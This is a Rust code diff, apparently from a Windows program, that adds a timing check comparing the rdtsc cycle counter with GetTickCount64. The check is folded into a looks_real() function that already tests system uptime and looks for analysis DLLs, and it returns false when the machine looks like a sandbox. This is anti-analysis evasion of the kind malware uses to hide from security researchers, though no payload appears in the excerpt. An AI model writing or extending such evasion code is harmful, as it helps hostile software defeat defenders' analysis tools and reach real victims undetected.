@@ -82,6 +82,34 @@ unsafe fn analysis_dll_present() -> bool {
     false
 }
 
+#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
+unsafe fn rdtsc() -> u64 {
+    let lo: u32;
+    let hi: u32;
+    core::arch::asm!("rdtsc", out("eax") lo, out("edx") hi, options(nostack, preserves_flags, nomem));
+    ((hi as u64) << 32) | lo as u64
+}
+
+#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
+unsafe fn time_accelerated() -> bool {
+    let t0 = GetTickCount64();
+    let tsc0 = rdtsc();
+    let mut sink: u64 = 1;
+    for i in 0u64..20_000_000u64 { sink = sink.wrapping_add(i); }
+    core::hint::black_box(sink);
+    let t1 = GetTickCount64();
+    let tsc1 = rdtsc();
+
+    let wall_ms = t1.saturating_sub(t0);
+    let tsc_delta = tsc1.saturating_sub(tsc0);
+
+    // Impossible: wall says >5ms passed but TSC says <500k cycles (would need >10 MHz clock to run 20M iters that fast)
+    if wall_ms > 5 && tsc_delta < 500_000 { return true; }
+    // Impossible: claimed effective clock > 100 GHz
+    if wall_ms > 0 && (tsc_delta / wall_ms) > 100_000_000 { return true; }
+    false
+}
+
 #[cfg(target_os = "windows")]
 pub unsafe fn looks_real() -> bool {
     // Uptime check: at least 30 minutes
@@ -107,6 +135,9 @@ pub unsafe fn looks_real() -> bool {
 
     #[cfg(target_os = "windows")]
     if analysis_dll_present() { return false; }
+
+    #[cfg(all(target_arch = "x86_64", target_os = "windows"))]
+    if time_accelerated() { return false; }
 
     true
 }
